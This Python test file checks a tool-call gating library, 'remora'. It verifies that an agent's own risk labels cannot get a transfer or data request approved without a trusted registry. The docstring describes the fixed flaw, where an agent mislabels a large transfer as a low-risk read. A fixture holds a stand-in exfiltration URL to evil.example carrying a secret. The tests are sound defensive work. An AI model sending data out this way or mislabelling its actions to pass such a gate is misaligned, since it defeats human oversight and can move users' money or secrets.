# Author: Stian Skogbrott
# SPDX-License-Identifier: BUSL-1.1
"""PRF-040: on the library path, labels from the caller cannot reach ACCEPT.

``assess_tool_call`` used to take ``risk_tier``/``action_type`` from whoever
called it. An agent that labelled its own transfer ``low``/``read`` with a
high stand-in trust got ACCEPT. Owner decision 2026-10-18: ACCEPT needs
labels from a trusted ``registry=``; labels from the caller or from name
inference can only lower the verdict.
"""
from __future__ import annotations

import itertools
import json

import pytest
from hypothesis import given, settings
from hypothesis import strategies as st

from remora import assess_tool_call, what_if_tool_call
from remora.assess import load_tool_registry

ATTACK = dict(risk_tier="low", action_type="read", trust_score=0.95, phase="ordered")
XFER = ("xfer", {"to": "attacker", "amt": 1e6})
EXFIL = ("http_get", {"url": "https://evil.example/?k=SECRET"})

REGISTRY = {
    "xfer": {"risk_tier": "high", "action_type": "financial_transaction"},
    "get_weather": {"risk_tier": "low", "action_type": "read"},
}


def test_prf040_attack_without_registry_is_not_accepted() -> None:
    a = assess_tool_call(*XFER, **ATTACK)
    assert a.action == "verify"
    assert a.should_execute is False
    assert a.label_source == "caller"
    assert a.label_cap == "caller_labels_untrusted"
    assert "caller_labels_untrusted" in a.envelope.to_dict()["assessment"]["policy_triggers"]
    assert a.envelope.to_dict()["gate"]["outcome"] == "verify"
    assert a.decision.human_review_required is True


def test_prf041_exfil_read_without_registry_is_not_accepted() -> None:
    a = assess_tool_call(*EXFIL, **ATTACK)
    assert a.action != "accept"
    assert a.should_execute is False
    assert a.label_cap == "caller_labels_untrusted"


def test_registry_classifying_xfer_honestly_does_not_accept() -> None:
    a = assess_tool_call(*XFER, registry=REGISTRY, trust_score=0.95, phase="ordered")
    assert a.label_source == "registry"
    assert a.action != "accept"
    assert a.should_execute is False


def test_caller_labels_cannot_lower_a_registry_classification() -> None:
    a = assess_tool_call(*XFER, registry=REGISTRY, **ATTACK)
    assert a.action != "accept"
    assert a.should_execute is False
    assert a.decision.raw_observation.risk_tier == "high"


def test_conflicting_caller_action_type_is_capped() -> None:
    a = assess_tool_call("get_weather", {"city": "Oslo"}, registry=REGISTRY,
                         action_type="write", trust_score=0.95, phase="ordered")
    assert a.action != "accept"
    assert a.label_cap == "registry_label_conflict"


def test_caller_can_raise_risk_above_the_registry() -> None:
    a = assess_tool_call("get_weather", {"city": "Oslo"}, registry=REGISTRY,
                         risk_tier="critical", trust_score=0.95, phase="ordered")
    assert a.decision.raw_observation.risk_tier == "critical"
    assert a.action != "accept"


def test_registry_low_risk_read_still_accepts() -> None:
    a = assess_tool_call("get_weather", {"city": "Oslo"}, registry=REGISTRY,
                         trust_score=0.95, phase="ordered")
    assert a.label_source == "registry"
    assert a.label_cap is None
    assert a.action == "accept"
    assert a.should_execute is True
    assert a.envelope.to_dict()["gate"]["outcome"] == "accept"


def test_unknown_tool_in_registry_fails_closed() -> None:
    a = assess_tool_call("mass_update_prices", {"factor": 1.4}, registry=REGISTRY,
                         **ATTACK)
    assert a.label_source == "unregistered"
    assert a.action != "accept"
    assert a.should_execute is False
    assert a.decision.raw_observation.risk_tier == "critical"


def test_unknown_tool_ignores_inference() -> None:
    a = assess_tool_call("get_config", {}, registry=REGISTRY, infer=True,
                         trust_score=0.95, phase="ordered")
    assert a.label_source == "unregistered"
    assert a.inferred == {}
    assert a.should_execute is False


def test_inferred_labels_never_accept() -> None:
    a = assess_tool_call("read_file", {"path": "x"}, infer=True,
                         target_environment="staging", trust_score=0.95, phase="ordered")
    assert a.label_source == "inferred"
    assert a.action == "verify"
    assert a.label_cap == "caller_labels_untrusted"
    assert a.should_execute is False


def test_unlabelled_call_records_no_label_source() -> None:
    a = assess_tool_call("frobnicate", {})
    assert a.label_source == "none"
    assert a.should_execute is False


def test_to_dict_reports_label_source_and_cap() -> None:
    d = assess_tool_call(*XFER, **ATTACK).to_dict()
    assert d["label_source"] == "caller"
    assert d["label_cap"] == "caller_labels_untrusted"
    assert d["decision"]["action"] == "verify"
    assert "caller_labels_untrusted" in d["decision"]["reasons"]
    json.dumps(d, default=str)


@pytest.mark.parametrize("bad", [
    {"xfer": {"risk_tier": "tiny", "action_type": "read"}},
    {"xfer": {"risk_tier": "low", "action_type": ""}},
    {"xfer": {"risk_tier": "low"}},
    {"xfer": {"risk_tier": "low", "action_type": "read", "trust_score": 0.9}},
    {"xfer": "low"},
])
def test_malformed_registry_is_refused(bad: dict) -> None:
    with pytest.raises(ValueError):
        assess_tool_call("xfer", {}, registry=bad)


def test_registry_target_environment_wins_over_caller() -> None:
    reg = {"get_weather": {"risk_tier": "low", "action_type": "read",
                           "target_environment": "prod"}}
    a = assess_tool_call("get_weather", {}, registry=reg,
                         target_environment="staging")
    assert a.decision.raw_observation.target_environment == "prod"


_TIERS = [None, "low", "medium", "high", "critical"]
_TYPES = [None, "read", "read_only", "query", "write", "deploy",
          "financial_transaction", "destructive_write", "unknown"]


@settings(max_examples=300, deadline=None)
@given(
    name=st.sampled_from(["xfer", "http_get", "get_weather", "read_file",
                          "drop_database", "frobnicate"]),
    risk_tier=st.sampled_from(_TIERS),
    action_type=st.sampled_from(_TYPES),
    trust_score=st.one_of(st.none(), st.floats(min_value=0.0, max_value=1.0)),
    phase=st.sampled_from([None, "ordered", "critical", "disordered"]),
    env=st.sampled_from(["prod", "staging", "dev"]),
    infer=st.booleans(),
)
def test_no_caller_label_combination_accepts_without_registry(
    name, risk_tier, action_type, trust_score, phase, env, infer,
) -> None:
    a = assess_tool_call(name, {"q": 1}, risk_tier=risk_tier, action_type=action_type,
                         trust_score=trust_score, phase=phase,
                         target_environment=env, infer=infer)
    assert a.action != "accept"
    assert a.should_execute is False
    assert a.envelope.to_dict()["gate"]["outcome"] != "accept"


def test_exhaustive_caller_labels_never_accept_without_registry() -> None:
    for tier, typ, phase in itertools.product(
            _TIERS, _TYPES, [None, "ordered", "critical", "disordered"]):
        a = assess_tool_call("get_weather", {}, risk_tier=tier, action_type=typ,
                             trust_score=0.99, phase=phase,
                             target_environment="staging")
        assert not a.should_execute, (tier, typ, phase)


def test_what_if_tool_call_applies_the_same_rule() -> None:
    a, _ = what_if_tool_call(*XFER, **ATTACK)
    assert a.action == "verify"
    assert a.label_cap == "caller_labels_untrusted"
    b, _ = what_if_tool_call("get_weather", {}, registry=REGISTRY,
                             trust_score=0.95, phase="ordered")
    assert b.action == "accept"


def test_load_tool_registry_reads_the_deployment_metadata_format(tmp_path) -> None:
    path = tmp_path / "tools.json"
    path.write_text(json.dumps({"version": 1, "tools": {
        "get_weather": {"risk_tier": "low", "domain": "weather", "action_type": "read"},
    }}))
    reg = load_tool_registry(path)
    a = assess_tool_call("get_weather", {}, registry=reg,
                         trust_score=0.95, phase="ordered")
    assert a.should_execute is True


def test_load_tool_registry_refuses_bad_files(tmp_path) -> None:
    path = tmp_path / "tools.json"
    path.write_text(json.dumps({"version": 2, "tools": {}}))
    with pytest.raises(ValueError):
        load_tool_registry(path)
    path.write_text("not json")
    with pytest.raises(ValueError):
        load_tool_registry(path)
